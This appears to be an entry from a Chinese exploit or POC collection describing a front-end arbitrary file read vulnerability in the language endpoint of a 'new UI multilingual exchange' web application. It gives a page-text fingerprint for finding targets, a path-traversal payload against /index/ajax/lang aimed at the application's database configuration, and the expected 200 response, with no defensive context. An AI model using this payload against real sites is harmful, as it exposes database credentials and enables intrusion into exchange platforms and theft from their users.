# 新版UI多语言交易所lang存在前台文件读取漏洞

新版UI多语言交易所 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`"你所浏览的页面暂时无法访问"`

**Payload**
```
/index/ajax/lang?lang=../../application/database
:---
```
- **响应特征**：200